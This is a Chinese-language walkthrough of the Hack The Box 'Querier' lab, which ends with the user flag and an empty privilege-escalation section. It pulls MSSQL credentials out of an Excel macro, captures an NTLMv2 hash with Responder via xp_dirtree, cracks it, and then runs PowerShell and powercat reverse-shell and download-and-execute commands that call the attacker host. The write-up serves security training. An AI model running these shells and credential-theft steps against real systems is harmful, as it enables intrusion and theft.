[TOC]

# Note —— Querirer

> victim: 10.10.10.125
>
> local: 10.10.14.4

## SMB

尝试默认账户和空账户

```bash
smbclient -L 10.10.10.125 -U ''%'' #无法登录
smbclient -L 10.10.10.125 -U 'guest'%''
```

guest登陆后可以看到Reports文件夹，进去看看

```bash
smbclient //10.10.10.125/Reports -U 'guest'%''
> ls
> get "Currency Volume Report.xlsm"
```

打开后看不到内容,xlsm格式说明其存在宏，我们以压缩包打开，在路径`xl\`下存在vba宏代码编译文件

对其进行反编译，使用**olevba**

```bash
sudo pip install -U oletools # 安装oletools分析套件
olevba vbaProject.bin
```

在代码中找到数据库的用户密码信息

- `Uid: reporting`
- `Pwd: PcwTWTHRwryjc$c6`
- `Database: volume`

## Mssql

利用得到的账号登陆，mssql的认证方式有用户认证和windows账号认证两种, 由于reporting账号是windows账号, 因此需要增加参数-windows-auth进行登陆并指定用户域querier/，特殊符号$需要进行转义

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth querier/reporting:PcwTWTHRwryjc\$c6@10.10.10.125
```
mssql操作
```mssql
enable_xp_cmdshell --尝试启用shell
```

```
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
```

失败

```mssql
select IS_SRVROLEMEMBER ( 'sysadmin' ) --检查是有否SA权限
```

```
0
```

没有，继续搜索

### 窃取HASH——利用smb和xp_dirtree/xp_fileexist

先在本地打开responder(新学到的技术)

> responder 一款嗅探工具，用来窃取连接者的信息
>
> 连接上来的连接都返回回应，告诉对方没错就是我，来窃取NTLMv2哈希

```bash
sudo responder -I tun0
```

在受害机器上执行下方两句之一

```mssql
exec xp_dirtree '\\10.10.14.4\share\file'
exec xp_fileexist '\\10.10.14.4\share\file'
```

捕获到信息，保存至`res/NTLMv2.md`

将HASH复制到文件里，命名为hash，使用john破解

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
sudo john hash -w=/usr/share/wordlists/rockyou.txt
```

得到

```
corporate568     (mssql-svc)
```

### 高权限账号登录

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth querier/mssql-svc:corporate568@10.10.10.125
```

```mssql
select IS_SRVROLEMEMBER ( 'sysadmin' )
-- 1
enable_xp_cmdshell
--运行成功
xp_cmdshell whoami
xp_cmdshell systeminfo
-- 内容保存到res/systeminfo.md
```

## 使用Powershell脚本获取shell

### 尝试ps payload——失败

本机开启nc监听443端口和文件下载用HTTP

```bash
sudo python3 -m http.server
```

目标上执行命令

```mssql
xp_cmdshell powershell iex(New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.4:8000/reverse.ps1\")
```

被AV杀了.....阿这

### 尝试Powercat base64 payload——失败

本机生成独立payload并base64编码

```powershell
powercat -c 10.10.14.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

```mssql
powershell -E <代码见res/systeminfo.md>
```

代码太长，无法执行，先当作文件传过去

```mssql
xp_cmdshell certutil -f -urlcache http://10.10.14.4:8000/encodedreverseshell.ps1 a.bat
```

执行失败，certutil没法用

### 尝试单行ps payload——失败

目标上执行命令

```mssql
xp_cmdshell powershell -c \"$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.4'',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);    $sendback =(iex $data 2>&1 | Out-String );    $sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);   $stream.Write($sendbyte,0,$sendbyte.Length);    $stream.Flush();}\"
```

木有反应，转义字符太多，太难顶，不折腾了

### 利用powercat直接payload——成功

```bash
xp_cmdshell powershell -noprofile IEX(New-Object System.Net.Webclient).DownloadString(\"http://10.10.14.4:8000/powercat.ps1\");powercat -c 10.10.14.4 -p 443 -e powershell
```

成功了，Powercat，永远的神

得到user.txt

```
c37b41bb669da345bb14de50faab3c16
```

## 提权

